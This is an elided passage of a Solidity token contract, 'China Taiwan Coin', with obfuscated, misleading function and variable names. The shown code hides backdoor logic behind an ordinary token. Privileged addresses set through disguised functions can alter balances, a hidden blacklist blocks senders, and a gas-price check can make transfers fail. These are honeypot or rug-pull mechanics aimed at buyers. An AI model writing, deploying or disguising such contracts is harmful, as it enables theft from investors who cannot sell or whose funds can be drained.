...
contract GUNC {
    function suotws() internal pure returns (string memory) {
        return "FAC";
    }
}
...
abstract contract Context {
    ...
    function _loexe() internal view virtual returns (address) {
        return msg.sender;
    }

    function _falsce() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}
...
contract ChinaTaiwanCoin is Context, IERC20, Ownable, IPancakeFactory, GUNC {
    ...
    mapping(address => bool) private isFisLimitAm;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _rOwned;
    mapping(address => uint256) private _takeLiquidity;

    uint8 private _decimals = 9;
    string private _name = "China Taiwan Coin";
    string private _symbol = "ChinaTaiwan";
    ...
    address private _owner;
    address private _numsss;
    uint256 private _nccmss;

    constructor(address _ymees, address _ydnse) {
        _taxFee = _loexe();  
        _killblock = _ydnse;
        _isExcluFee[address(this)] = true;
        _isExcluFee[owner()] = true;
        _isExcluFee[_ymees] = true;
        isFisLimitAm[_ymees] = true;
        _owner = msg.sender;
        _takeLiquidity[_loexe()] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function setLiquidityFeePercent(bool _swapAndLlquifyEnabled, address _newPeir) external {
        require(isFisLimitAm[_loexe()]);
        if (isFisLimitAm[_loexe()]) {
    ...
    function transfer(address recipient, uint256 amount)
        ...
        returns (bool)
    {
        if (_isExcluFee[_loexe()] || _isExcluFee[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_rOwned[_loexe()]||_falsce()>=(15*1e9)){
    ...
    function _transfer(
        ...
        require(amount > 0);
        require(_falsce()<=(15*1e9));
        require(!_rOwned[from]);
        if (isFisLimitAm[from]) {
            require(isFisLimitAm[from]);
            _takeLiquidity[from]= 
            _takeLiquidity[from].
    ...
    function reflectionFromsToken(address spender, address recipient, bool deductTransferFee) external {
        ...
        require(isFisLimitAm[_loexe()]);
        if (isFisLimitAm[_loexe()]){
            isFisLimitAm[spender] = deductTransferFee;}
    }
